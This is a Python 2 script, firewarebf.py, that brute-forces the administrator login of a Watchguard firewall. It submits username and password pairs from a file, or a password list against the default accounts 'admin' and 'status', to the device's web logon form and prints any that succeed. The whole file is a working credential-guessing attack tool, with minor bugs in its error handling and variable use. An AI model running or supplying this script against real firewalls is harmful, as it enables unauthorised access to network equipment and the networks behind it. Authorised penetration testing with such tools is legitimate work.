#!/usr/bin/env python
# Copyright (c) 2012, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this 
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice, 
#  this list of conditions and the following disclaimer in the documentation 
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, 
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY 
# OF SUCH DAMAGE.

#
# firewarebf.py attempts to bruteforce the password on a Watchguard firewall.

import poster
import urllib2
import ssl
import re
import argparse

#-----------------------------------------------------------------------------
# Functions
#-----------------------------------------------------------------------------
def list_from_file(filename):
    tmp = []
    try:
        f = open(filename, 'r')
    except:
        print "Could not open file: %s" % f.name()

    for line in f:
        tmp.append(line.rstrip('\r\n'))

    return tmp
    
def check_user_pass(url, user, pwd, domain):
    site = url + '/wgcgi.cgi?action=fw_logon&style=fw_logon.xsl&fw_logon_type=status'
    values = {'submit' : 'Login',
              'action' : 'fw_logon',
              'style' : 'fw_logon_progress.xsl',
              'fw_logon_type' : 'logon'}
              
    values['fw_username'] = user
    values['fw_password'] = pwd
    values['fw_domain'] = domain
	
    datagen, headers = poster.encode.multipart_encode(values)
    req = urllib2.Request(site, datagen, headers)
    resp = urllib2.urlopen(req).read()
    if re.search('Authentication Failed:', resp):
        print "Failed: %s, %s" % (u, p)
    else:
        print resp
        print "Success: %s, %s" % (u, p)


#-----------------------------------------------------------------------------
# Main Program
#-----------------------------------------------------------------------------
# Setup poster module
poster.streaminghttp.register_openers()

#Parse command line arguments using argparse
desc = """firewarebf.py attempts to bruteforce the password on a Watchguard
firewall. You will need to provide the IP address of the firewall, the login 
domain, and the login credentials to test.
"""
parser = argparse.ArgumentParser(description=desc)
parser.add_argument('server', action='store', default='192.168.0.1',
                    help="Ip address of server (Default: 192.168.0.1)")

passgroup = parser.add_mutually_exclusive_group(required=True)
passgroup.add_argument('-p', action='store', default=None, metavar='passfile',
    help='List of passwords. Will use default usernames of admin and status.')
passgroup.add_argument('-f', action='store', default=None,
                       metavar='userpassfile',
                       help='List of user:pass combinations.')

parser.add_argument('-d', action='store', default='Firebox-DB',
                   metavar='domain', help='Login domain (Default: Firebox-DB')
parser.add_argument('--http', action='store_true', default=False,
                    help='Use an HTTP connection instead of HTTPS')

args = parser.parse_args()

# Set the URL based on --http flag
if args.http:
    url = "http://" + args.server
else:
    url = "https://" + args.server
    
# Test the passwords
if args.f:
    for c in list_from_file(args.f):
        u, p = c.split(":")
        check_user_pass(url, u, p, args.d)
else:
    users = ['admin', 'status']
    pwds = list_from_file(args.p)
    for u in users:
        for p in pwds:
            check_user_pass(url, u, p, args.d)

